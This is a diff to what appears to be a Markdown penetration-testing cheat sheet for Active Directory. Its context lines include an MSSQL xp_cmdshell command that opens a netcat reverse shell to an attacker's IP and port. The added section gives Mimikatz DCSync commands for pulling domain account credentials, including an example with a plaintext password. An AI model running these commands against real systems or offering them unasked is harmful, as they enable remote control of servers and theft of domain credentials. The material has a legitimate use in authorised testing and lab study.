@@ -440,6 +440,20 @@ RECONFIGURE
 EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port>';
 ```
 
+### :open_file_folder: Mimikatz
+
+[![Windows](https://badgen.net/badge/icon/windows?icon=windows&label)]
+
+DCSync
+
+```powershell
+REM domain admin
+lsadump::dcsync /domain:<domain> /dc:<domain controller> /user:<specific user>
+REM authuser with Replicating Directory Changes and Replicating Directory Changes All permissions
+lsadump::dcsync /domain:<domain> /dc:<domain controller> /user:<specific user> /authuser:<authuser> /authdomain:<authdomain> /authpassword:<authpassword> /authntlm
+REM e.g., lsadump::dcsync /domain:TEST.LOCAL /user:user01 /authuser:vitamin /authdomain:TEST /authpassword:"eRFWE5756872Gn" /authntlm
+```
+
 ### :open_file_folder: Test Environment
 
 First we have to set up AD server, we can use the evaluation edition of windows sever. I chose to download the VHD version.
